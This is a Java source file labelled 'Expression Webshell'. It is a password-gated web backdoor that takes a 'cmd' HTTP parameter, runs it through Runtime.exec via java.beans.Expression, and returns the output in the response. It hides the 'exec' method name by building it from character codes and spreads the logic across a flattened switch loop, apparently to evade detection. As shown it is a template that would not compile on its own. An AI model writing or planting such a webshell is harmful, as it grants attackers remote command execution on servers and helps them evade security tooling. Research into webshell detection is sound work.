package org.sec.util;

/**
 * Expression Webshell
 */
public class Beans {
    public static void main(String[] args) {
        String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21", "cmd", "pwd", "<pre>", "</pre>"};
        String temp = globalArr[0];
        String[] b = temp.split("\\|");

        String cmd = null;
        String pwd = null;
        Runtime rt = null;
        StringBuilder methodNameBuilder = null;
        String methodName = null;
        Object[] objs = null;
        java.beans.Expression shell = null;
        Object ret = null;
        Process pc = null;
        java.io.InputStream in = null;
        StringBuilder outStr = null;
        java.io.InputStreamReader resulutReader = null;
        java.io.BufferedReader stdInput = null;

        int index = 0;
        while (true) {
            int op = Integer.parseInt(b[index++]);
            switch (op) {
                case 0:
                    cmd = request.getParameter(globalArr[1]);
                    break;
                case 1:
                    pwd = request.getParameter(globalArr[2]);
                    break;
                case 2:
                    if (!pwd.equals(PASSWORD)) {
                        return;
                    }
                    break;
                case 3:
                    rt = Runtime.getRuntime();
                    break;
                case 4:
                    methodNameBuilder = new StringBuilder();
                    break;
                case 5:
                    methodNameBuilder.append((char) 101);
                    break;
                case 6:
                    methodNameBuilder.append((char) 120);
                    break;
                case 7:
                    methodNameBuilder.append((char) 101);
                    break;
                case 8:
                    methodNameBuilder.append((char) 99);
                    break;
                case 9:
                    methodName = methodNameBuilder.toString();
                    break;
                case 10:
                    objs = new Object[]{cmd};
                    break;
                case 11:
                    shell = new java.beans.Expression(rt, methodName, objs);
                    break;
                case 12:
                    ret = shell.getValue();
                    break;
                case 13:
                    pc = (Process) ret;
                    break;
                case 14:
                    in = pc.getInputStream();
                    break;
                case 15:
                    outStr = new StringBuilder();
                    break;
                case 16:
                    response.getWriter().print(globalArr[3]);
                    break;
                case 17:
                    resulutReader = new java.io.InputStreamReader(in);
                    break;
                case 18:
                    stdInput = new java.io.BufferedReader(resulutReader);
                    break;
                case 19:
                    String s = null;
                    while ((s = stdInput.readLine()) != null) {
                        outStr.append(s + "\n");
                    }
                    break;
                case 20:
                    response.getWriter().print(outStr.toString());
                    break;
                case 21:
                    response.getWriter().print(globalArr[4]);
                    break;
            }
        }
    }
}
